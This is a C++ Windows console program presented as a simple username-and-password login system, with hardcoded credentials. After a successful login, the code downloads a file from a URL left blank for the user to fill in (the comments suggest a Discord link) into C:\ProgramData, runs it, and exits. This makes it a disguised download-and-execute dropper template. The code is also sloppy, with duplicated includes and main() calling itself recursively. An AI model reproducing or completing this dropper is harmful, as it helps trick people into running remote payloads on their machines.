#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <iostream>
#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <random>
#include <csignal>
#include <fstream>
#include <iostream>
#include <sstream> 
#include <iostream>
#include <random>
#include <string>
#include <fstream>
#include <sstream>
#include <strsafe.h>
#pragma comment(lib, "urlmon.lib")


using namespace std;

int main()
	{
	
	SetConsoleTitleA("Login System created by yuno#2285");   // To display your title on the console

	string Username;
	string RegisteredUsername = "user";  // To change the user name

	cout << " \n";  // To return to the line in the console
	cout << " \n";
	cout << " \n";
	cout << " Enter User : ";
	system("color 1");  // Allows you to change the color of the text in the console
	Sleep(950);
;
	cin >> Username;
	system("cls");  // To clear the console
		

	string Password;
	string RegisteredPassword = "password";  // To change the user's password

	bool Loggedin = false;

	while (Loggedin == false)
	{
		if (Username != RegisteredUsername)
		{
			system("cls");
			cout << " \n";
			cout << " \n";
			cout << " \n";
			cout << " You have entered a wrong user !";
			system("color C");
			Sleep(950);  // After 950ms you can retype your password
			system("cls");
			main();  // To return to the beginning of the program
			cin >> Password;
		}

		if (Username == RegisteredUsername)
		{		
			cout << " \n";  
			cout << " \n";
			cout << " \n";
			cout << " Enter Password : "; 
			system("color 1");
			Sleep(950);
			cin >> Password;


			if (Password == RegisteredPassword)
			{
				system("cls");
				cout << " \n";
				cout << " \n";
				cout << " \n";
				cout << " Enter Password : ";
				cout << " Successful connection ! " << endl;  // This message appears if the user enters the correct password
				system("color 6");
				Sleep(950);
				Loggedin = true;
				void checker();
				{
					string TEST = "  ";  // Enter the Discord link for the user to install another file.
					string LOGIN = "C:\ProgramData\...";  // Select the path to your file 
					URLDownloadToFileA(NULL, TEST.c_str(), LOGIN.c_str(), 0, NULL);;
					system("Start C:\ProgramData\...");  // Enter the path to your file so that it runs
					exit(3);
				}

			}
			else
			{
				system("cls"); 
				cout << " \n";
				cout << " \n";
				cout << " \n";
				cout << " You have entered a wrong password ! " << endl;  // This message appears if the user enters a wrong password
				system("color c");
				Sleep(950);  
				system("cls");

				
			}
		}

	}
	system("pause");
}

